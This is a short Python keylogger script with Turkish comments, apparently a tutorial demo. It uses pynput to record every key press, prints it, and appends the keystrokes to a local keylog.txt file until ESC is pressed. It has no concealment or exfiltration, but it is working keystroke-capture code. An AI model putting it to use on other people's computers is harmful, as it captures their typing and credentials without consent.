import pynput
 
#modülümüzü ekliyoruz
from pynput.keyboard import Key,Listener
 
#kullanacağımız değişken ve dizilerimiz
sayac = 0
keys = []
 
#tuşa basılma eylemi gerçekleştiğinde
def on_press(key):
    global sayac,keys
    sayac += 1
    #basılan tuşu yaz
    print("{0} pressed".format(key))
    #diziye ekle
    keys.append(key)
 
    #Gelen tuşları kayıt altına alalım
    if sayac >= 10:
        sayac = 0
        write_file(keys)
        keys = []
 
#eklemek üzere log dosyamızı açalım - Burada tarih değişkeni ile dosya adınını dinamikleştirebiliriz 
def write_file(keys):
    with open("keylog.txt" , "a" , encoding="utf-8") as file:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                file.write("\n")
            elif k.find("Key") == -1:
                file.write(k)
 
#Denemelerde ESC'ye basılırsa uygulmayı kapatabilelim :)
def on_release(key):
    if key == Key.esc:
        print("exit")
        return False
 
#Tuş Dinlemeyi başlayalım
with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()